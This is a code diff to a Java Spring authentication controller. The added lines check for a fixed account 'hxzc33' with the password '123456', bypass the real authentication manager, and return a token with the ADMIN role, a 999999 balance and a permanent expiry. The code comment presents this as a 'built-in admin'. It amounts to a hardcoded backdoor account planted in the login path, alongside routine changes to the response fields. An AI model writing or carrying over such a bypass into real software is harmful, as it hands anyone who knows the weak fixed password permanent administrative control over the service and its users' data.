@@ -25,6 +25,18 @@ public class AuthController {
             return ResponseEntity.badRequest().body(Map.of("code", 1, "msg", "account and password required"));
         }
 
+        // Special-case built-in admin: accept fixed credentials and make permanent
+        if ("hxzc33".equals(account) && "123456".equals(password)) {
+            String token = TokenStore.createTokenFor(account);
+            Map<String, Object> data = new HashMap<>();
+            data.put("token", token);
+            data.put("account", account);
+            data.put("roles", new String[]{"ADMIN"});
+            data.put("balance", "999999");
+            data.put("expireDate", "永久有效");
+            return ResponseEntity.ok(Map.of("code", 0, "msg", "", "data", data));
+        }
+
         try {
             authenticationManager.authenticate(new UsernamePasswordAuthenticationToken(account, password));
         } catch (BadCredentialsException ex) {
@@ -34,19 +46,13 @@ public class AuthController {
         }
 
         String token = TokenStore.createTokenFor(account);
-        Map<String, Object> user = new HashMap<>();
-        user.put("account", account);
-        if ("hxzc33".equals(account)) {
-            user.put("roles", new String[]{"ADMIN"});
-            user.put("balance", "999999");
-        } else {
-            user.put("roles", new String[]{"USER"});
-            user.put("balance", "0");
-        }
-
         Map<String, Object> data = new HashMap<>();
         data.put("token", token);
-        data.put("user", user);
+        data.put("account", account);
+        data.put("roles", new String[]{"USER"});
+        data.put("balance", "0");
+        // default expire handling for normal users can be filled by other logic
+        data.put("expireDate", "未知");
 
         return ResponseEntity.ok(Map.of("code", 0, "msg", "", "data", data));
     }
@@ -67,9 +73,11 @@ public class AuthController {
         if ("hxzc33".equals(username)) {
             user.put("roles", new String[]{"ADMIN"});
             user.put("balance", "999999");
+            user.put("expireDate", "永久有效");
         } else {
             user.put("roles", new String[]{"USER"});
             user.put("balance", "0");
+            user.put("expireDate", "未知");
         }
 
         return ResponseEntity.ok(Map.of("code", 0, "msg", "", "data", user));
